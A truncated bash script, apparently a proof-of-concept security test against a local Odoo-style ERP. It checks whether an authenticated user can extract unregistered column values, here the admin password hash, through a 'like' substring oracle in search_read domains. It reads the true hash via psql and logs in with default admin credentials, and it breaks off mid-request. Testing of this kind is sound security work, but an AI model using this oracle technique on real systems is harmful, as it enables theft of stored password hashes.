#!/bin/bash
# Decisive: can an authenticated user EXTRACT the value of a column that
# is not a registered field, using only search_read domains?
#
# `like` is contains-semantics (%value%), matching the reference ERP. So a substring
# oracle is exactly what it provides.
BASE=${BASE:-http://127.0.0.1:8069}
DBN=${DBN:-odoo}

TRUE_HASH=$(PGPASSWORD=odoo psql -q -h localhost -U "$DBN" -d "$DBN" -tAc \
            "SELECT password FROM res_users WHERE id=1" | tr -d ' ')
echo "ground truth (first 40): ${TRUE_HASH:0:40}"
echo

cat > /tmp/p3_auth.json <<EOF
{"jsonrpc":"2.0","method":"call","params":{"db":"$DBN","login":"admin","password":"admin"}}
EOF
SID=$(curl -s -X POST "$BASE/web